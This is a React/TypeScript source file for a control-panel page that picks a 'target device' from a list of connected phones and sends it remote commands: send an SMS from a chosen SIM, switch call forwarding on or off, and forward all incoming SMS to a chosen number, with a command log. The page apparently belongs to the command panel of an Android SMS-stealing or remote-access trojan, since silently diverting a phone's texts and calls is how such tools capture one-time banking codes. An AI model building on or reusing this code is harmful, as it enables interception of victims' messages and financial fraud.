import { useState } from 'react'
import { useApp } from '../AppContext'
import { sendCommand } from '../api'
import { deviceModel } from '../utils'

const SVG = ({ path, size = 14 }: { path: string; size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d={path} />
  </svg>
)

export default function CommandsPage({ devices }: { devices: any[] }) {
  const { toast } = useApp()
  const [targetId, setTargetId] = useState('')
  const [log, setLog] = useState<string[]>([])
  const [smsSim, setSmsSim] = useState('0')
  const [smsTo, setSmsTo] = useState('')
  const [smsMsg, setSmsMsg] = useState('')
  const [callSim, setCallSim] = useState('0')
  const [callTo, setCallTo] = useState('')
  const [fwdTo, setFwdTo] = useState('')

  const addLog = (text: string) => {
    setLog(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev].slice(0, 50))
  }

  const getTarget = () => {
    if (!targetId) { toast('Select a device first', 'error'); return null }
    return targetId
  }

  const cmdSendSms = async () => {
    const devId = getTarget()
    if (!devId) return
    if (!smsTo || !smsMsg) { toast('Fill all fields', 'error'); return }
    try {
      await sendCommand({ device_id: devId, cmd: 'send_sms', simSlot: parseInt(smsSim), phoneNumber: smsTo, messageText: smsMsg })
      toast('SMS command sent!', 'success')
      addLog(`SMS to ${smsTo} via SIM${(parseInt(smsSim) + 1)}: ${smsMsg.substring(0, 30)}...`)
      setSmsTo(''); setSmsMsg('')
    } catch (e: any) { toast('Error: ' + e.message, 'error') }
  }

  const cmdCall = async (enable: boolean) => {
    const devId = getTarget()
    if (!devId) return
    if (enable && !callTo) { toast('Enter number', 'error'); return }
    try {
      await sendCommand({ device_id: devId, cmd: enable ? 'call_forward_on' : 'call_forward_off', simSlot: parseInt(callSim), phoneNumber: callTo })
      toast(enable ? 'Call forwarding activated!' : 'Call forwarding deactivated!', 'success')
      addLog(`Call Forward ${enable ? 'ON' : 'OFF'} to ${callTo || 'N/A'} SIM${(parseInt(callSim) + 1)}`)
      if (enable) setCallTo('')
    } catch (e: any) { toast('Error: ' + e.message, 'error') }
  }

  const cmdSmsForward = async (enable: boolean) => {
    const devId = getTarget()
    if (!devId) return
    if (enable && !fwdTo) { toast('Enter number', 'error'); return }
    try {
      await sendCommand({ device_id: devId, cmd: enable ? 'sms_forward_on' : 'sms_forward_off', phoneNumber: fwdTo })
      toast(enable ? 'SMS forwarding enabled!' : 'SMS forwarding disabled!', 'success')
      addLog(`SMS Forward ${enable ? 'ON' : 'OFF'} to ${fwdTo || 'N/A'}`)
      if (enable) setFwdTo('')
    } catch (e: any) { toast('Error: ' + e.message, 'error') }
  }

  return (
    <div>
      <div className="field">
        <label><SVG path="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><span style={{marginLeft:4}}>Target Device</span></label>
        <select value={targetId} onChange={(e) => setTargetId(e.target.value)}>
          <option value="">-- Choose Device --</option>
          {devices.map(d => (
            <option key={d.id} value={d.id}>{deviceModel(d)} ({d.status === 'online' ? 'Online' : 'Offline'})</option>
          ))}
        </select>
      </div>

      <div className="cmd-section">
        <div className="cmd-title"><SVG path="M22 2 11 13M22 2l-7 20-4-9-9-4 20-7z"/> Send SMS</div>
        <div className="cmd-form">
          <div className="field"><label>SIM Slot</label><select value={smsSim} onChange={e => setSmsSim(e.target.value)}><option value="0">SIM 1</option><option value="1">SIM 2</option></select></div>
          <div className="field"><label>To Number</label><input type="text" placeholder="+919876543210" value={smsTo} onChange={e => setSmsTo(e.target.value)}/></div>
          <div className="field"><label>Message</label><textarea placeholder="Enter message..." value={smsMsg} onChange={e => setSmsMsg(e.target.value)}/></div>
          <button className="btn btn-primary btn-block" onClick={cmdSendSms}><SVG path="M22 2 11 13M22 2l-7 20-4-9-9-4 20-7z"/> Send SMS</button>
        </div>
      </div>

      <div className="cmd-section">
        <div className="cmd-title"><SVG path="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/> Call Forwarding</div>
        <div className="cmd-form">
          <div className="field"><label>SIM Slot</label><select value={callSim} onChange={e => setCallSim(e.target.value)}><option value="0">SIM 1</option><option value="1">SIM 2</option></select></div>
          <div className="field"><label>Forward To Number</label><input type="text" placeholder="+919876543210" value={callTo} onChange={e => setCallTo(e.target.value)}/></div>
          <div style={{display:'flex',gap:8}}>
            <button className="btn btn-primary" style={{flex:1}} onClick={() => cmdCall(true)}><SVG path="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/> Activate</button>
            <button className="btn btn-danger" style={{flex:1}} onClick={() => cmdCall(false)}><SVG path="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6"/> Deactivate</button>
          </div>
        </div>
      </div>

      <div className="cmd-section">
        <div className="cmd-title"><SVG path="M22 12h-4l-3 9L9 3l-3 9H2"/> SMS Forwarding</div>
        <div className="cmd-form">
          <div className="field"><label>Forward All SMS To</label><input type="text" placeholder="+919876543210" value={fwdTo} onChange={e => setFwdTo(e.target.value)}/></div>
          <div style={{display:'flex',gap:8}}>
            <button className="btn btn-success" style={{flex:1}} onClick={() => cmdSmsForward(true)}><SVG path="M22 12h-4l-3 9L9 3l-3 9H2"/> Enable</button>
            <button className="btn btn-danger" style={{flex:1}} onClick={() => cmdSmsForward(false)}><SVG path="M18 6 6 18M6 6l12 12"/> Disable</button>
          </div>
        </div>
      </div>

      <div className="cmd-section">
        <div className="cmd-title"><SVG path="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8zM14 2v6h6M16 13H8M16 17H8M10 9H8"/> Command Log</div>
        <div style={{fontSize:11,color:'var(--text3)',maxHeight:200,overflowY:'auto',background:'var(--glass)',border:'1px solid var(--border)',borderRadius:'var(--radius)',padding:10}}>
          {log.length === 0 ? <span style={{opacity:.5}}>No commands sent yet</span> : log.map((e, i) => (
            <div key={i} style={{padding:'4px 0',borderBottom:'1px solid var(--border)'}}>{e}</div>
          ))}
        </div>
      </div>
    </div>
  )
}
